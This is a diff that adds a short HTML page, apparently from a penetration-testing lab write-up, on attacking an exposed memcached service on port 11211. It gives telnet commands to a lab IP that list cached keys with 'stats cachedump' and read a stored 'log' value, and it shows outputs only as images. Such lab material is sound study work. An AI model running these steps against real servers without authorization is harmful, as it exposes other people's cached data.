@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3.1 Port 11211 "memcache"</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>3.1 Port 11211 "memcache"</h1><br/><p></p><p><span style="indent:1;">The 11211 port is a “memcache” service. You can get more information at </span><a href="https://memcached.org/">https://memcached.org/</a><span style="indent:1;">.</span></p><p><span style="indent:1;"></span></p><p><span style="indent:1;"></span><img src="images/1110-1.png" alt="images/1110-1.png" /></p><p></p><p><span style="indent:1;">According to an example you can use telnet on the port 11211. There&#39;s a more detail explanation at </span><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a><span style="indent:1;"> so as to get </span>the exploitation.</p><p></p><p></p><p>1. Run the following on your Kali Machine.</p><p>    <div class="codebox"><pre>$ telnet 192.168.12.75 11211</pre></div></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1110-2.png" alt="images/1110-2.png" /></p><p>   </p><p>2. Run this command.</p><p>    <div class="codebox"><pre>stats cachedump 1 0<br /></pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span>   </p><p>    <img src="images/1110-3.png" alt="images/1110-3.png" /></p><p></p><p>3. Get the logs.</p><p>    <div class="codebox"><pre>get log</pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1110-4.png" alt="images/1110-4.png" /></p><p></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
